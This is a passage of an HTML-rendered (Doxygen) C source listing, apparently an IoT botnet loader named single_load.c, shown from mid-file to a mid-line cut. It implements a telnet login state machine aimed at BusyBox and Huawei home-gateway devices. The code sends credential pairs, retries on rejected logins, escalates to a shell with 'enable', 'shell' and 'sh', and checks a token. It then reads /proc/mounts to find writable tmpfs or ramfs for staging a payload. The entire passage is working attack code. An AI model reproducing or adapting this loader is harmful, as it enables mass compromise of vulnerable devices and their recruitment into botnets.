href="single__load_8c.html#af831315881831b845a3bc22693da57a3">epollFD</a>, pevents, 25, 10000 )) &gt;= 0 || (ret == -1 &amp;&amp; errno == EINTR))</div><div class="line"><a name="l00343"></a><span class="lineno">  343</span>&#160;    {</div><div class="line"><a name="l00344"></a><span class="lineno">  344</span>&#160;        <span class="keywordflow">if</span>(ret == 0) <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00345"></a><span class="lineno">  345</span>&#160;        <span class="keywordflow">for</span>(i = 0; i &lt; ret; i++)</div><div class="line"><a name="l00346"></a><span class="lineno">  346</span>&#160;        {</div><div class="line"><a name="l00347"></a><span class="lineno">  347</span>&#160;            <span class="keywordflow">if</span>((pevents[i].events &amp; EPOLLERR) || (pevents[i].events &amp; EPOLLHUP) || (pevents[i].events &amp; EPOLLRDHUP) || (!(pevents[i].events &amp; EPOLLIN) &amp;&amp; !(pevents[i].events &amp; EPOLLOUT)))</div><div class="line"><a name="l00348"></a><span class="lineno">  348</span>&#160;            {</div><div class="line"><a name="l00349"></a><span class="lineno">  349</span>&#160;                <span class="keyword">struct </span><a class="code" href="structstateSlot__t.html">stateSlot_t</a> *<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = &amp;<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[pevents[i].data.fd];</div><div class="line"><a name="l00350"></a><span class="lineno">  350</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 0) <a class="code" href="single__load_8c.html#aa3595475b02d25686ffadbcf19472db2">handle_failed_connect</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>);</div><div class="line"><a name="l00351"></a><span class="lineno">  351</span>&#160;                <span class="keywordflow">else</span> <a class="code" href="single__load_8c.html#af12c2939d7340f74f1b3aa3f5cd49ca7">handle_remote_closed</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>);</div><div class="line"><a name="l00352"></a><span class="lineno">  352</span>&#160;                pthread_mutex_lock(&amp;state-&gt;<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>);</div><div class="line"><a name="l00353"></a><span class="lineno">  353</span>&#160;                <a class="code" href="single__load_8c.html#ab5a5480e7ca5603df2e3fb59300b966a">closeAndCleanup</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>);</div><div class="line"><a name="l00354"></a><span class="lineno">  354</span>&#160;                pthread_mutex_unlock(&amp;state-&gt;<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>);</div><div class="line"><a name="l00355"></a><span class="lineno">  355</span>&#160;            } <span class="keywordflow">else</span> <span class="keywordflow">if</span>(pevents[i].events &amp; EPOLLIN)</div><div class="line"><a name="l00356"></a><span class="lineno">  356</span>&#160;            {</div><div class="line"><a name="l00357"></a><span class="lineno">  357</span>&#160;                <span class="keywordtype">int</span> is_closed = 0;</div><div class="line"><a name="l00358"></a><span class="lineno">  358</span>&#160;                <span class="keyword">struct </span><a class="code" href="structstateSlot__t.html">stateSlot_t</a> *<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = &amp;<a class="code" href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a>[pevents[i].data.fd];</div><div class="line"><a name="l00359"></a><span class="lineno">  359</span>&#160;                </div><div class="line"><a name="l00360"></a><span class="lineno">  360</span>&#160;                memset(buf, 0, 10241);</div><div class="line"><a name="l00361"></a><span class="lineno">  361</span>&#160;                </div><div class="line"><a name="l00362"></a><span class="lineno">  362</span>&#160;                pthread_mutex_lock(&amp;state-&gt;<a class="code" href="structstateSlot__t.html#ad53d5380e8c4e25db6de2ae2f356158a">mutex</a>);</div><div class="line"><a name="l00363"></a><span class="lineno">  363</span>&#160;                <span class="keywordtype">int</span> old_state = state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a>;</div><div class="line"><a name="l00364"></a><span class="lineno">  364</span>&#160;                </div><div class="line"><a name="l00365"></a><span class="lineno">  365</span>&#160;                got = 0;</div><div class="line"><a name="l00366"></a><span class="lineno">  366</span>&#160;                <span class="keywordflow">do</span></div><div class="line"><a name="l00367"></a><span class="lineno">  367</span>&#160;                {</div><div class="line"><a name="l00368"></a><span class="lineno">  368</span>&#160;                    <span class="keywordflow">if</span>(state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 1)</div><div class="line"><a name="l00369"></a><span class="lineno">  369</span>&#160;                    {</div><div class="line"><a name="l00370"></a><span class="lineno">  370</span>&#160;                        <span class="keywordflow">if</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 1, MSG_PEEK)) &gt; 0 &amp;&amp; buf[0] == 0xFF)</div><div class="line"><a name="l00371"></a><span class="lineno">  371</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 2;</div><div class="line"><a name="l00372"></a><span class="lineno">  372</span>&#160;                        </div><div class="line"><a name="l00373"></a><span class="lineno">  373</span>&#160;                        <span class="keywordflow">if</span> (got &gt; 0 &amp;&amp; buf[0] != 0xFF)</div><div class="line"><a name="l00374"></a><span class="lineno">  374</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 3;</div><div class="line"><a name="l00375"></a><span class="lineno">  375</span>&#160;                    }</div><div class="line"><a name="l00376"></a><span class="lineno">  376</span>&#160;</div><div class="line"><a name="l00377"></a><span class="lineno">  377</span>&#160;                    <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 2)</div><div class="line"><a name="l00378"></a><span class="lineno">  378</span>&#160;                    {</div><div class="line"><a name="l00379"></a><span class="lineno">  379</span>&#160;                        <span class="comment">//from first peek</span></div><div class="line"><a name="l00380"></a><span class="lineno">  380</span>&#160;                        <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 1, 0);</div><div class="line"><a name="l00381"></a><span class="lineno">  381</span>&#160;                        </div><div class="line"><a name="l00382"></a><span class="lineno">  382</span>&#160;                        got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf + 1, 2, 0);</div><div class="line"><a name="l00383"></a><span class="lineno">  383</span>&#160;                        <span class="keywordflow">if</span> (got &gt; 0)</div><div class="line"><a name="l00384"></a><span class="lineno">  384</span>&#160;                        {</div><div class="line"><a name="l00385"></a><span class="lineno">  385</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 1;</div><div class="line"><a name="l00386"></a><span class="lineno">  386</span>&#160;                            </div><div class="line"><a name="l00387"></a><span class="lineno">  387</span>&#160;                            <span class="keywordflow">if</span> (buf[1] == 0xFD &amp;&amp; buf[2] == 31)</div><div class="line"><a name="l00388"></a><span class="lineno">  388</span>&#160;                            {</div><div class="line"><a name="l00389"></a><span class="lineno">  389</span>&#160;                                <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> tmp1[3] = {255, 251, 31};</div><div class="line"><a name="l00390"></a><span class="lineno">  390</span>&#160;                                <a class="code" href="single__load_8c.html#a1ce52af2a54d5a57b7c857001720ba65">log_send</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, tmp1, 3, MSG_NOSIGNAL);</div><div class="line"><a name="l00391"></a><span class="lineno">  391</span>&#160;                                <span class="keywordtype">unsigned</span> <span class="keywordtype">char</span> tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};</div><div class="line"><a name="l00392"></a><span class="lineno">  392</span>&#160;                                <a class="code" href="single__load_8c.html#a1ce52af2a54d5a57b7c857001720ba65">log_send</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, tmp2, 9, MSG_NOSIGNAL);</div><div class="line"><a name="l00393"></a><span class="lineno">  393</span>&#160;                                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00394"></a><span class="lineno">  394</span>&#160;                            }</div><div class="line"><a name="l00395"></a><span class="lineno">  395</span>&#160;                            </div><div class="line"><a name="l00396"></a><span class="lineno">  396</span>&#160;                            <span class="keywordflow">for</span> (ii = 0; ii &lt; 3; ii++)</div><div class="line"><a name="l00397"></a><span class="lineno">  397</span>&#160;                            {</div><div class="line"><a name="l00398"></a><span class="lineno">  398</span>&#160;                                    <span class="keywordflow">if</span> (buf[ii] == 0xFD) buf[ii] = 0xFC;</div><div class="line"><a name="l00399"></a><span class="lineno">  399</span>&#160;                                    <span class="keywordflow">else</span> <span class="keywordflow">if</span> (buf[ii] == 0xFB) buf[ii] = 0xFD;</div><div class="line"><a name="l00400"></a><span class="lineno">  400</span>&#160;                            }</div><div class="line"><a name="l00401"></a><span class="lineno">  401</span>&#160;                            <a class="code" href="single__load_8c.html#a1ce52af2a54d5a57b7c857001720ba65">log_send</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 3, MSG_NOSIGNAL);</div><div class="line"><a name="l00402"></a><span class="lineno">  402</span>&#160;                        }</div><div class="line"><a name="l00403"></a><span class="lineno">  403</span>&#160;                    }</div><div class="line"><a name="l00404"></a><span class="lineno">  404</span>&#160;                } <span class="keywordflow">while</span>(got &gt; 0 &amp;&amp; state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> != 3);</div><div class="line"><a name="l00405"></a><span class="lineno">  405</span>&#160;                </div><div class="line"><a name="l00406"></a><span class="lineno">  406</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 3)</div><div class="line"><a name="l00407"></a><span class="lineno">  407</span>&#160;                {</div><div class="line"><a name="l00408"></a><span class="lineno">  408</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00409"></a><span class="lineno">  409</span>&#160;                    {</div><div class="line"><a name="l00410"></a><span class="lineno">  410</span>&#160;                        <span class="comment">//special case for huawei</span></div><div class="line"><a name="l00411"></a><span class="lineno">  411</span>&#160;                        <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#a46a5c759285caddc5c5a39aee3b2c48d">memmem</a>(buf, got, <span class="stringliteral">&quot;Huawei Home Gateway&quot;</span>, 19) != NULL)</div><div class="line"><a name="l00412"></a><span class="lineno">  412</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#af2928a0b0dd2a40d06b5f2294593274f">special</a> = 1;</div><div class="line"><a name="l00413"></a><span class="lineno">  413</span>&#160;                        </div><div class="line"><a name="l00414"></a><span class="lineno">  414</span>&#160;                        <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#a46a5c759285caddc5c5a39aee3b2c48d">memmem</a>(buf, got, <span class="stringliteral">&quot;BusyBox&quot;</span>, 7) != NULL)</div><div class="line"><a name="l00415"></a><span class="lineno">  415</span>&#160;                        {</div><div class="line"><a name="l00416"></a><span class="lineno">  416</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a04169334dba5afd2745542626499cd4d">got_prompt</a> = 1;</div><div class="line"><a name="l00417"></a><span class="lineno">  417</span>&#160;                            </div><div class="line"><a name="l00418"></a><span class="lineno">  418</span>&#160;                            <span class="comment">//maybe we are logged in already? LOL</span></div><div class="line"><a name="l00419"></a><span class="lineno">  419</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;enable\r\n&quot;</span>);</div><div class="line"><a name="l00420"></a><span class="lineno">  420</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 7;</div><div class="line"><a name="l00421"></a><span class="lineno">  421</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00422"></a><span class="lineno">  422</span>&#160;                        }</div><div class="line"><a name="l00423"></a><span class="lineno">  423</span>&#160;                        </div><div class="line"><a name="l00424"></a><span class="lineno">  424</span>&#160;                        <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#a46a5c759285caddc5c5a39aee3b2c48d">memmem</a>(buf, got, <span class="stringliteral">&quot;ogin&quot;</span>, 4) != NULL || <a class="code" href="single__load_8c.html#a46a5c759285caddc5c5a39aee3b2c48d">memmem</a>(buf, got, <span class="stringliteral">&quot;sername&quot;</span>, 7) != NULL || <a class="code" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a>(buf))</div><div class="line"><a name="l00425"></a><span class="lineno">  425</span>&#160;                        {</div><div class="line"><a name="l00426"></a><span class="lineno">  426</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a04169334dba5afd2745542626499cd4d">got_prompt</a> = 1;</div><div class="line"><a name="l00427"></a><span class="lineno">  427</span>&#160;                            </div><div class="line"><a name="l00428"></a><span class="lineno">  428</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;%s\r\n&quot;</span>, state-&gt;<a class="code" href="structstateSlot__t.html#a77d151d0f9c4e016ba16d3444e0d3553">username</a>);</div><div class="line"><a name="l00429"></a><span class="lineno">  429</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 4;</div><div class="line"><a name="l00430"></a><span class="lineno">  430</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00431"></a><span class="lineno">  431</span>&#160;                        }</div><div class="line"><a name="l00432"></a><span class="lineno">  432</span>&#160;                    }</div><div class="line"><a name="l00433"></a><span class="lineno">  433</span>&#160;                }</div><div class="line"><a name="l00434"></a><span class="lineno">  434</span>&#160;                </div><div class="line"><a name="l00435"></a><span class="lineno">  435</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 4)</div><div class="line"><a name="l00436"></a><span class="lineno">  436</span>&#160;                {</div><div class="line"><a name="l00437"></a><span class="lineno">  437</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00438"></a><span class="lineno">  438</span>&#160;                    {</div><div class="line"><a name="l00439"></a><span class="lineno">  439</span>&#160;                        <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#a46a5c759285caddc5c5a39aee3b2c48d">memmem</a>(buf, got, <span class="stringliteral">&quot;assword&quot;</span>, 7) != NULL || <a class="code" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a>(buf))</div><div class="line"><a name="l00440"></a><span class="lineno">  440</span>&#160;                        {</div><div class="line"><a name="l00441"></a><span class="lineno">  441</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;%s\r\n&quot;</span>, state-&gt;<a class="code" href="structstateSlot__t.html#a04cd8d776257013858dce1f54c7a0d74">password</a>);</div><div class="line"><a name="l00442"></a><span class="lineno">  442</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 5;</div><div class="line"><a name="l00443"></a><span class="lineno">  443</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00444"></a><span class="lineno">  444</span>&#160;                        }</div><div class="line"><a name="l00445"></a><span class="lineno">  445</span>&#160;                    }</div><div class="line"><a name="l00446"></a><span class="lineno">  446</span>&#160;                }</div><div class="line"><a name="l00447"></a><span class="lineno">  447</span>&#160;                </div><div class="line"><a name="l00448"></a><span class="lineno">  448</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 5)</div><div class="line"><a name="l00449"></a><span class="lineno">  449</span>&#160;                {</div><div class="line"><a name="l00450"></a><span class="lineno">  450</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00451"></a><span class="lineno">  451</span>&#160;                    {</div><div class="line"><a name="l00452"></a><span class="lineno">  452</span>&#160;                        <span class="keywordflow">if</span> (strcasestr(buf, <span class="stringliteral">&quot;access denied&quot;</span>) != NULL || strcasestr(buf, <span class="stringliteral">&quot;invalid password&quot;</span>) != NULL || strcasestr(buf, <span class="stringliteral">&quot;login incorrect&quot;</span>) != NULL || strcasestr(buf, <span class="stringliteral">&quot;password is wrong&quot;</span>) != NULL)</div><div class="line"><a name="l00453"></a><span class="lineno">  453</span>&#160;                        {</div><div class="line"><a name="l00454"></a><span class="lineno">  454</span>&#160;                            <span class="comment">//bad login. reconnect and retry</span></div><div class="line"><a name="l00455"></a><span class="lineno">  455</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 254;</div><div class="line"><a name="l00456"></a><span class="lineno">  456</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00457"></a><span class="lineno">  457</span>&#160;                        }</div><div class="line"><a name="l00458"></a><span class="lineno">  458</span>&#160;                        </div><div class="line"><a name="l00459"></a><span class="lineno">  459</span>&#160;                        <span class="keywordflow">if</span> (strcasestr(buf, <span class="stringliteral">&quot;BusyBox&quot;</span>) != NULL || <a class="code" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a>(buf))</div><div class="line"><a name="l00460"></a><span class="lineno">  460</span>&#160;                        {</div><div class="line"><a name="l00461"></a><span class="lineno">  461</span>&#160;                            <span class="comment">//REASONABLY sure we got a good login.</span></div><div class="line"><a name="l00462"></a><span class="lineno">  462</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;enable\r\n&quot;</span>);</div><div class="line"><a name="l00463"></a><span class="lineno">  463</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 6;</div><div class="line"><a name="l00464"></a><span class="lineno">  464</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00465"></a><span class="lineno">  465</span>&#160;                        }</div><div class="line"><a name="l00466"></a><span class="lineno">  466</span>&#160;                    }</div><div class="line"><a name="l00467"></a><span class="lineno">  467</span>&#160;                }</div><div class="line"><a name="l00468"></a><span class="lineno">  468</span>&#160;                </div><div class="line"><a name="l00469"></a><span class="lineno">  469</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 6)</div><div class="line"><a name="l00470"></a><span class="lineno">  470</span>&#160;                {</div><div class="line"><a name="l00471"></a><span class="lineno">  471</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00472"></a><span class="lineno">  472</span>&#160;                    {</div><div class="line"><a name="l00473"></a><span class="lineno">  473</span>&#160;                        <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;shell\r\n&quot;</span>);</div><div class="line"><a name="l00474"></a><span class="lineno">  474</span>&#160;                        state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 7;</div><div class="line"><a name="l00475"></a><span class="lineno">  475</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00476"></a><span class="lineno">  476</span>&#160;                    }</div><div class="line"><a name="l00477"></a><span class="lineno">  477</span>&#160;                }</div><div class="line"><a name="l00478"></a><span class="lineno">  478</span>&#160;                </div><div class="line"><a name="l00479"></a><span class="lineno">  479</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 7)</div><div class="line"><a name="l00480"></a><span class="lineno">  480</span>&#160;                {</div><div class="line"><a name="l00481"></a><span class="lineno">  481</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00482"></a><span class="lineno">  482</span>&#160;                    {</div><div class="line"><a name="l00483"></a><span class="lineno">  483</span>&#160;                        <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;sh\r\n&quot;</span>);</div><div class="line"><a name="l00484"></a><span class="lineno">  484</span>&#160;                        <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#af2928a0b0dd2a40d06b5f2294593274f">special</a> == 1)</div><div class="line"><a name="l00485"></a><span class="lineno">  485</span>&#160;                        {</div><div class="line"><a name="l00486"></a><span class="lineno">  486</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 250;</div><div class="line"><a name="l00487"></a><span class="lineno">  487</span>&#160;                        } <span class="keywordflow">else</span> {</div><div class="line"><a name="l00488"></a><span class="lineno">  488</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 8;</div><div class="line"><a name="l00489"></a><span class="lineno">  489</span>&#160;                        }</div><div class="line"><a name="l00490"></a><span class="lineno">  490</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00491"></a><span class="lineno">  491</span>&#160;                    }</div><div class="line"><a name="l00492"></a><span class="lineno">  492</span>&#160;                }</div><div class="line"><a name="l00493"></a><span class="lineno">  493</span>&#160;                </div><div class="line"><a name="l00494"></a><span class="lineno">  494</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 8)</div><div class="line"><a name="l00495"></a><span class="lineno">  495</span>&#160;                {</div><div class="line"><a name="l00496"></a><span class="lineno">  496</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00497"></a><span class="lineno">  497</span>&#160;                    {</div><div class="line"><a name="l00498"></a><span class="lineno">  498</span>&#160;                        <span class="keywordflow">if</span> (<a class="code" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a>(buf))</div><div class="line"><a name="l00499"></a><span class="lineno">  499</span>&#160;                        {</div><div class="line"><a name="l00500"></a><span class="lineno">  500</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;%s\r\n&quot;</span>, <a class="code" href="single__load_8c.html#a5c3a83864bf5991d09aa5c2abb911bf0">TOKEN</a>);</div><div class="line"><a name="l00501"></a><span class="lineno">  501</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 9;</div><div class="line"><a name="l00502"></a><span class="lineno">  502</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00503"></a><span class="lineno">  503</span>&#160;                        }</div><div class="line"><a name="l00504"></a><span class="lineno">  504</span>&#160;                    }</div><div class="line"><a name="l00505"></a><span class="lineno">  505</span>&#160;                }</div><div class="line"><a name="l00506"></a><span class="lineno">  506</span>&#160;                </div><div class="line"><a name="l00507"></a><span class="lineno">  507</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 9)</div><div class="line"><a name="l00508"></a><span class="lineno">  508</span>&#160;                {</div><div class="line"><a name="l00509"></a><span class="lineno">  509</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00510"></a><span class="lineno">  510</span>&#160;                    {</div><div class="line"><a name="l00511"></a><span class="lineno">  511</span>&#160;                        <span class="keywordflow">if</span> (strcasestr(buf, <a class="code" href="single__load_8c.html#aa2b7fda41691fd8bf8cdfb06ca803451">TOKEN_VERIFY</a>) != NULL &amp;&amp; <a class="code" href="single__load_8c.html#af5f21519b5c3a467090f9d34153880ed">matchPrompt</a>(buf))</div><div class="line"><a name="l00512"></a><span class="lineno">  512</span>&#160;                        {</div><div class="line"><a name="l00513"></a><span class="lineno">  513</span>&#160;                            <a class="code" href="single__load_8c.html#a9e3a1d6d9c69a0538ce2947564ea65a7">sockprintf</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, <span class="stringliteral">&quot;cat /proc/mounts\r\n&quot;</span>);</div><div class="line"><a name="l00514"></a><span class="lineno">  514</span>&#160;                            state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> = 10;</div><div class="line"><a name="l00515"></a><span class="lineno">  515</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00516"></a><span class="lineno">  516</span>&#160;                        }</div><div class="line"><a name="l00517"></a><span class="lineno">  517</span>&#160;                    }</div><div class="line"><a name="l00518"></a><span class="lineno">  518</span>&#160;                }</div><div class="line"><a name="l00519"></a><span class="lineno">  519</span>&#160;                </div><div class="line"><a name="l00520"></a><span class="lineno">  520</span>&#160;                <span class="keywordflow">if</span> (state-&gt;<a class="code" href="structstateSlot__t.html#a4e5442d9c3efde0f37f2177e33dccac9">state</a> == 10)</div><div class="line"><a name="l00521"></a><span class="lineno">  521</span>&#160;                {</div><div class="line"><a name="l00522"></a><span class="lineno">  522</span>&#160;                    <span class="keywordflow">while</span> ((got = <a class="code" href="single__load_8c.html#ac962089ec347c5f622ead313b02c802d">log_recv</a>(state-&gt;<a class="code" href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">fd</a>, buf, 10240, 0)) &gt; 0)</div><div class="line"><a name="l00523"></a><span class="lineno">  523</span>&#160;                    {</div><div class="line"><a name="l00524"></a><span class="lineno">  524</span>&#160;                        <span class="keywordflow">if</span> (strstr(buf, <span class="stringliteral">&quot;tmpfs&quot;</span>) != NULL || strstr(buf, <span class="stringliteral">&quot;ramfs&quot;</span>) != NULL)</div><div class="line"><a name="l00525"></a><span class="lineno">  525</span>&#160;                        {</div><div class="line"><a name="l00526"></a><span class="lineno">  526</span>&#160;                            <span class="keywordtype">char</span> *tmp_buf = buf;</div><div class="line"><a name="l00527"></a><span class="lineno">  527</span>&#160;                            <span class="keywordtype">char</span> *start = NULL;</div><div class="line"><a name="l00528"></a><span class="lineno">  528</span>&#160;                            <span 